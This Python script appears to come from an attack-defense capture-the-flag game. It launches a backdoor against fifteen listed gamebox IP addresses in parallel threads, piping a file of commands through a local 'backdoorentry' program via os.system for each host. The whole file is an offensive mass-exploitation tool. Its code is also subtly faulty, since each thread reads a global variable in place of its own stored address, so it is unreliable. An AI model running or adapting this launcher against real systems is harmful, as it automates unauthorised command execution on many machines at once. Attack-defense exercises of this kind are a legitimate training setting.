#!/usr/bin/env python3
import os
import threading

gameboxs = [
	"10.217.1.201",
	"10.217.2.201",
	"10.217.3.201",
	"10.217.5.201",
	"10.217.6.201",
	"10.217.7.201",
	"10.217.8.201",
	"10.217.9.201",
	"10.217.10.201",
	"10.217.11.201",
	"10.217.12.201",
	"10.217.13.201",
	"10.217.14.201",
	"10.217.15.201",
	"10.217.16.201"
]

class mythread(threading.Thread):
	def __init__(self, ip):
		threading.Thread.__init__(self)
		self.ip = ip

	def run(self):
		cmd = "cat backdoorcmd | ./backdoorentry %s"%(ip)
		os.system(cmd)

for ip in gameboxs:
	mythread(ip).start()
